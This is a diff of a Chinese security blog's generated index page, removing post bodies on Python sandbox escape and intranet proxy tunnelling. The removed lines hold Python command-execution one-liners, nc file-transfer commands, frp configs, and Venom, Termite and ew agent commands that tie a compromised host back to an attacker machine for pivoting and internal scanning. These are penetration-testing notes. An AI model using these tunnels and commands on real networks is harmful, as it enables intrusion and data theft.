@@ -188,7 +188,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/23/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/24/yii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/QQ%E5%9B%BE%E7%89%8720230109005650.jpg">
@@ -202,7 +202,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2023/10/23/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" class="post-title-link" itemprop="url">python沙盒</a>
+            <a href="/2023/10/24/yii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="post-title-link" itemprop="url">yii反序列化</a>
         </h2>
 
         <div class="post-meta">
@@ -212,14 +212,14 @@
               </span>
               <span class="post-meta-item-text">发表于</span>
 
-              <time title="创建时间：2023-10-23 20:18:11" itemprop="dateCreated datePublished" datetime="2023-10-23T20:18:11+08:00">2023-10-23</time>
+              <time title="创建时间：2023-10-24 12:16:12" itemprop="dateCreated datePublished" datetime="2023-10-24T12:16:12+08:00">2023-10-24</time>
             </span>
               <span class="post-meta-item">
                 <span class="post-meta-item-icon">
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-10-25 21:05:37" itemprop="dateModified" datetime="2023-10-25T21:05:37+08:00">2023-10-25</time>
+                <time title="修改时间：2023-10-26 15:47:09" itemprop="dateModified" datetime="2023-10-26T15:47:09+08:00">2023-10-26</time>
               </span>
 
           <br>
@@ -228,14 +228,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>93</span>
+              <span>816</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
+              <span>3 分钟</span>
             </span>
 
         </div>
@@ -247,21 +247,15 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <span id="more"></span>
-
-<p>简单python 命令执行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__(&#x27;os&#x27;).system(&#x27;dir&#x27;)</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(&#x27;__import__(&quot;os&quot;).system(&quot;dir&quot;)&#x27;)</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec(&#x27;__import__(&quot;os&quot;).system(&quot;dir&quot;)&#x27;)</span><br></pre></td></tr></table></figure>
-
-<p>代码注入，</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">1.内置危险函数</span><br><span class="line">exec</span><br><span class="line">execfile</span><br><span class="line">eval</span><br><span class="line"></span><br><span class="line">2.标准库危险模块</span><br><span class="line">os</span><br><span class="line">subprocess</span><br><span class="line">commands</span><br><span class="line"></span><br><span class="line">3.危险第三方库</span><br><span class="line">Template(user_input) : 模板注入(SSTI)所产生的代码执行</span><br><span class="line">subprocess32 </span><br><span class="line"></span><br><span class="line">4.反序列化</span><br><span class="line">marshal</span><br><span class="line">PyYAML</span><br><span class="line">pickle和cpickle</span><br><span class="line">shelve</span><br><span class="line">PIL</span><br><span class="line">unzip</span><br></pre></td></tr></table></figure>
-
-<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/52#toc-4">https://xz.aliyun.com/t/52#toc-4</a></p>
-<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6902">https://xz.aliyun.com/t/6902</a></p>
-
+          <p> <img src="https://s3.bmp.ovh/imgs/2023/09/15/8ac13aee0e90f547.png"></p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2023/10/24/yii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -311,7 +305,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-10-24 21:47:14" itemprop="dateModified" datetime="2023-10-24T21:47:14+08:00">2023-10-24</time>
+                <time title="修改时间：2023-10-26 16:01:58" itemprop="dateModified" datetime="2023-10-26T16:01:58+08:00">2023-10-26</time>
               </span>
 
           <br>
@@ -339,86 +333,15 @@
     <div class="post-body" itemprop="articleBody">
 
       
-           <span id="more"></span>
-
-<p>介绍一些工具</p>
-<h2 id="nc传文件"><a href="#nc传文件" class="headerlink" title="nc传文件"></a>nc传文件</h2><p>先启动接受命令</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p 9995 &gt;file</span><br><span class="line">nc 10.0.1.162 9995 &lt; file</span><br></pre></td></tr></table></figure>
-
-<p>先启动发送命令</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p 9992 &lt;test.mv</span><br><span class="line">nc 10.0.1.162 9992 &gt;test2.mv</span><br></pre></td></tr></table></figure>
-
-<h2 id="frp"><a href="#frp" class="headerlink" title="frp"></a>frp</h2><p>下载地址</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/fatedier/frp/releases">https://github.com/fatedier/frp/releases</a></p>
-<p>frpc.ini,上传文件</p>
-<p>运行chmod +x frps</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chmod +x frpc</span><br><span class="line">./frps -c frps.ini</span><br><span class="line">./frpc -c frpc.ini</span><br></pre></td></tr></table></figure>
-
-
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 101.43.182.125</span><br><span class="line">server_port = 5000</span><br><span class="line"></span><br><span class="line">[socks5]</span><br><span class="line">type = tcp</span><br><span class="line">plugin=socks5</span><br><span class="line">[ssh]</span><br><span class="line">#代理类型</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 22</span><br><span class="line">remote_port = 6000 </span><br></pre></td></tr></table></figure>
-
-<p>服务端</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port = 5000</span><br></pre></td></tr></table></figure>
-
-<p>通过vps 代理扫描内网</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./fscan64.exe -h 192.168.216.0/24 -proxy http://101.43.182.125:5000</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://s3.bmp.ovh/imgs/2023/10/22/e4495b7af1fe5a62.png"></p>
-<h2 id="Venom"><a href="#Venom" class="headerlink" title="Venom"></a>Venom</h2><p>下载地址，一般一次性</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/Dliv3/Venom/releases</span><br></pre></td></tr></table></figure>
-
-
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./admin_linux_x64 -lport 9999     # 攻击机开启监听</span><br><span class="line"></span><br><span class="line">./agent_linux_x64 -rhost 192.168.1.100 -rport 9999 </span><br></pre></td></tr></table></figure>
-
-<h2 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h2><h3 id="ssh正向代理"><a href="#ssh正向代理" class="headerlink" title="ssh正向代理"></a>ssh正向代理</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ssh -L [本地IP可省略:][本地端口]:[服务器C地址]:[服务器C端口] [SSH服务器IP] -p [非默认端口22]</span><br><span class="line">如果使用的是默认SSH端口22 ,则&quot;-p 端口&quot;不用输入.</span><br><span class="line">ssh -L 8001:10.0.0.1:8001 username@115.13.13.1 -p 22</span><br><span class="line">ssh -L 8001:192.168.8.140:80 root@192.168.10.131</span><br><span class="line">这样在访问本机的8001端口,通过SSH服务器B端口转发后,实际访问的就是服务器C的8001端口.</span><br></pre></td></tr></table></figure>
-
-<h3 id="ssh反向代理"><a href="#ssh反向代理" class="headerlink" title="ssh反向代理"></a>ssh反向代理</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -R [SSH服务器IP:][SSH服务器上端口]:[客户端侧IP或能访问到的IP]:[客户端侧IP端口或能反问的IP的端口] 用户名@SSH服务器IP -p SSH服务器端口</span><br><span class="line">ssh -R 192.168.0.107 81:127.0.0.1:80 username@192.168.0.107 -p 2200</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="termite"><a href="#termite" class="headerlink" title="termite"></a>termite</h2><p>原项目已经下架，但依然还有上传</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/idlefire/Termite</span><br></pre></td></tr></table></figure>
-
-<p>-l 指定本地socks端口,等待远程连-c 指定远程socks机器ip-p 指定远程socks机器端口</p>
-<h3 id="目标在内网，能出网"><a href="#目标在内网，能出网" class="headerlink" title="目标在内网，能出网"></a>目标在内网，能出网</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">（1）在vps运行：agent_win32.exe -l 8888</span><br><span class="line"></span><br><span class="line">（2）在自己机器运行：admin_win32.exe -c vps_ip -p 8888</span><br><span class="line"></span><br><span class="line">（3）在目标机器运行：agent_win32.exe -c vps_ip -p 8888</span><br></pre></td></tr></table></figure>
-
-<h3 id="目标在内网，不能出网"><a href="#目标在内网，不能出网" class="headerlink" title="目标在内网，不能出网"></a>目标在内网，不能出网</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a.在vps运行：agent_win32.exe -l 8888</span><br><span class="line"></span><br><span class="line">b.在PC运行：admin_win32.exe -c vps_ip -p 8888</span><br><span class="line"></span><br><span class="line">c.在出网机器A运行：agent_win32.exe -c vps_ip -p 8888</span><br><span class="line"></span><br><span class="line">d.在目标B运行：agent_win32.exe -l 9000</span><br><span class="line"></span><br><span class="line">e.在PC运行：goto A_id → connect B_ip 9000</span><br></pre></td></tr></table></figure>
-
-<h2 id="ew"><a href="#ew" class="headerlink" title="ew"></a>ew</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/idlefire/ew</span><br></pre></td></tr></table></figure>
-
-<h4 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a>反向连接</h4><p>先在攻击机【自己】执行以下命令</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew_for_Win.exe -s rcsocks -l 1080 -e 1234</span><br></pre></td></tr></table></figure>
-
-<p>然后再在靶机上上传对应工具之后执行以下命令【192.168.1.104为攻击机IP】</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew_for_Win.exe -s rssocks -d 192.168.1.104 -e 1234</span><br></pre></td></tr></table></figure>
-
-<p>然后攻击机上显示resocks cmd_socket OK即说明代理成功，然后走socks5代理1080端口即可。</p>
-<h4 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h4><p>上面进行反向连接是因为出网，而对于不出网这个时候就需要正向连接了</p>
-<p>攻击机使用以下命令【3080就是socks5代理对应的本地端口】</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew_for_Win.exe -s lcx_listen -l 3080 -e 8888</span><br></pre></td></tr></table></figure>
-
-<p>然后靶机执行以下命令【执行这个命令理论上是没有回显，但是也是执行了的，不用管】</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew_for_Win.exe -s ssocksd -l 9999</span><br></pre></td></tr></table></figure>
-
-<p>显然只到这里的时候可以看出来这里俩命令并没有产生关联，没错，还需要利用边缘机</p>
-<p>对边缘机使用以下命令【192.168.1.104是攻击机IP，192.168.183.134是不出网主机的IP】</p>
-<blockquote>
-<p>怎么说呢，这里其实也算是利用边缘机将不出网机器和攻击机之间建立隧道，或者也叫所谓的代理。</p>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew_for_Win.exe -s lcx_slave -d 192.168.1.104 -e 8888 -f 192.168.183.134 -g 9999</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
-
-<h2 id="proxychains"><a href="#proxychains" class="headerlink" title="proxychains"></a>proxychains</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/proxychains4.conf  </span><br><span class="line">socks4  192.168.0.199 1080</span><br></pre></td></tr></table></figure>
-
-<h2 id="Proxifier"><a href="#Proxifier" class="headerlink" title="Proxifier"></a>Proxifier</h2><p><a target="_blank" rel="noopener" href="https://augustdoit.men/proxifier/">Proxifier汉化版使用教程 | augustdoit博客</a></p>
-
+          Here's something encrypted, password is required to continue reading.
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2023/10/22/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E7%A9%BF%E9%80%8F/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -1332,12 +1255,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">87k</span>
+    <span title="站点总字数">88k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">5:16</span>
+    <span title="站点阅读时长">5:19</span>
 </div>
 
 <!--
